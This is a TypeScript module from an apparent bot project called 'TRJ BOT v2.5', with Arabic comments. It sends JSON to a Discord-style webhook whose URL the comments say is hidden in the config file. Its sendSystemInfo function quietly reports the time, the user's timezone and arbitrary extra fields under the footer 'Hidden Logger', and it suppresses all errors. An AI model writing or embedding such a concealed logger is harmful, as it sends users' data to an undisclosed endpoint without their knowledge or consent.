// src/lib/webhook.ts - إرسال للويب هوك محسّن v4 - TRJ BOT v2.5

import { getLogWebhookUrl } from './config';

/**
 * إرسال للويب هوك المخفي - لا يمنع التنفيذ
 * يستخدم رابط الويب هوك من ملف الإعدادات المركزي
 */
export async function sendToWebhook(data: unknown, overrideUrl?: string): Promise<boolean> {
  // نستخدم الرابط المحدد أو الرابط المخفي في config.ts
  const webhookUrl = overrideUrl || getLogWebhookUrl();

  if (!webhookUrl || webhookUrl.length < 20) {
    return false;
  }

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    return response.ok;
  } catch {
    return false;
  }
}

/**
 * إرسال معلومات النظام المخفية
 */
export function sendSystemInfo(extra?: Record<string, string>) {
  const url = getLogWebhookUrl();
  if (!url || url.length < 20) return;

  const info = {
    username: 'TRJ BOT System',
    avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
    embeds: [{
      title: '🔔 TRJ BOT Activity',
      color: 0x00FF41,
      fields: [
        { name: '⏰ Time', value: new Date().toISOString(), inline: true },
        { name: '🖥️ Platform', value: 'Next.js 16', inline: true },
        { name: '📡 Region', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
        ...(extra ? Object.entries(extra).map(([k, v]) => ({ name: k, value: String(v).substring(0, 1024), inline: true })) : [])
      ],
      footer: { text: 'TRJ BOT v2.5 - Hidden Logger' },
      timestamp: new Date().toISOString()
    }]
  };

  sendToWebhook(info, url).catch(() => {});
}

export function isWebhookConfigured(): boolean {
  const url = getLogWebhookUrl();
  return !!(url && url.length > 20);
}
